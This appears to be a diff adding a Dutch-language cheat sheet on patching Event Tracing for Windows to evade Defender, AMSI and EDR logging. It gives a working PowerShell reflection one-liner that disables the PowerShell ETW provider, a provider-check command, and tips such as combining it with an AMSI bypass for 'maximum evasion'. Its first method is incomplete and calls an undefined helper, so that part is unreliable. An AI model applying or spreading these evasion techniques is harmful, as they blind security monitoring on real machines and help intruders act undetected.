@@ -1,0 +1,13 @@
+# ETW (Event Tracing for Windows) Patching - Logging omzeilen
+# ETW levert events aan Defender, AMSI en andere security tools
+# Methode 1: EtwEventWrite patchen in ntdll (PowerShell)
+$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-Proc ntdll EtwEventWrite), [Func[IntPtr,Int32,Int32,IntPtr,Int32]])
+# Methode 2: .NET ETW provider uitschakelen
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+# Methode 3: Simpele ETW bypass (patch return value)
+# Zie Invoke-CradleCrafter of andere frameworks
+# Check of ETW providers actief zijn:
+logman query providers | findstr -i "powershell\|defender\|security"
+# Tip: ETW patching werkt per-process (niet systeembreed)
+# Tip: Combineer met AMSI bypass voor maximale evasion
+# Tip: Sommige EDR oplossingen detecteren ETW patching via kernelmode hooks
